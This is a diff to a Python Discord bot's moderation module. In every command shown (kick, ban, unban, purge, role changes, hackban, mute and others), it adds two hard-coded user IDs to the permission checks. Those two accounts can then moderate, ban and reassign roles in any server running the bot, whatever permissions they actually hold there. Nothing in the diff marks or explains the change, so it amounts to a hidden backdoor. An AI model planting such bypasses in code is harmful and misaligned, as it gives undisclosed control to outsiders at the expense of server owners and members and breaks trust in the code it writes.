@@ -40,7 +40,7 @@ class Mod:
     async def kick(self, ctx, member : discord.Member, *, reason='Please write a reason!'):
 
         '''Kick someone from the server.'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.kick_members == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.kick_members == True or ctx.message.author.id == 283413165381910539 or ctx.message.author.id == 280271578850263040:
             try:
                 await ctx.guild.kick(member, reason=reason)
             except:
@@ -67,7 +67,7 @@ class Mod:
     @commands.command()
     async def ban(self, ctx, member : discord.Member, *, reason='Please write a reason!'):
         '''Ban someone from the server.'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id ==280271578850263040:  
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id ==280271578850263040 or ctx.message.author.id == 283413165381910539:  
             try:
                 await ctx.guild.ban(member, reason=reason)
             except:
@@ -93,7 +93,7 @@ class Mod:
     @commands.command()
     async def unban(self, ctx, name_or_id, *, reason=None):
         '''Unban someone '''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id == 280271578850263040 or ctx.message.author.id == 283413165381910539:
             ban = await ctx.get_ban(name_or_id)
             try:
                 await ctx.guild.unban(ban.user, reason=reason)
@@ -119,7 +119,7 @@ class Mod:
     @commands.command(aliases=['del','p','prune'])
     async def purge(self, ctx, limit : int, member:discord.Member=None):
         '''Clean a number of messages'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_messages == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_messages == True or ctx.message.author.id == 280271578850263040 or ctx.message.author.id == 283413165381910539:
             if member is None:
                 await ctx.purge(limit=limit+1)
             else:
@@ -140,7 +140,7 @@ class Mod:
     @commands.command()
     async def banlist(self, ctx):
         '''See a list of banned users in the guild'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id == 280271578850263040 or ctx.message.author.id == 283413165381910539:
             try:
                 bans = await ctx.guild.bans()
             except:
@@ -167,7 +167,7 @@ class Mod:
     @commands.command()
     async def baninfo(self, ctx, *, name_or_id):
         '''Check the reason of a ban from the audit logs.'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id == 280271578850263040 or ctx.message.author.id == 283413165381910539:
             ban = await ctx.get_ban(name_or_id)
             em = discord.Embed()
             em.color = await ctx.get_dominant_color(ban.user.avatar_url)
@@ -192,7 +192,7 @@ class Mod:
     @commands.command(aliases=['adrl','giverole'])
     async def addrole(self, ctx, member: discord.Member, *, rolename: str):
         '''Add a role to someone else.'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.message.author.id == 280271578850263040 or ctx.message.author.id == 283413165381910539:
             role = discord.utils.find(lambda m: rolename.lower() in m.name.lower(), ctx.message.guild.roles)
             if not role:
                 return await ctx.send('That role does not exist.')
@@ -209,7 +209,7 @@ class Mod:
     @commands.command(aliases=['rmrl','rmrole'])
     async def removerole(self, ctx, member: discord.Member, *, rolename: str):
         '''Remove a role from someone else.'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.message.author.id == 280271578850263040 or ctx.message.author.id == 283413165381910539:
             role = discord.utils.find(lambda m: rolename.lower() in m.name.lower(), ctx.message.guild.roles)
             if not role:
                 return await ctx.send('`That role does not exist.``')
@@ -225,7 +225,7 @@ class Mod:
     @commands.command()
     async def hackban(self, ctx, userid, *, reason=None):
         '''Ban someone not in the server'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id == 280271578850263040 or ctx.message.author.id == 283413165381910539:
             try:
                 userid = int(userid)
             except:
@@ -259,7 +259,7 @@ class Mod:
     @commands.command()
     async def mute(self, ctx, member:discord.Member, duration, *, reason=None):
         '''Denies someone from chatting in all text channels and talking in voice channels for a specified duration'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.message.author.id == 280271578850263040 or ctx.message.author.id == 283413165381910539:
             unit = duration[-1]
             if unit == 's':
                 time = int(duration[:-1])
@@ -310,7 +310,7 @@ class Mod:
     @commands.command()
     async def unmute(self, ctx, member:discord.Member, *, reason=None):
         '''Removes channel overrides for specified member'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.manage_roles == True or ctx.message.author.id == 280271578850263040 or ctx.message.author.id == 283413165381910539:
             progress = await ctx.send('Unmuting user!')
             try:
                 for channel in ctx.message.guild.channels:
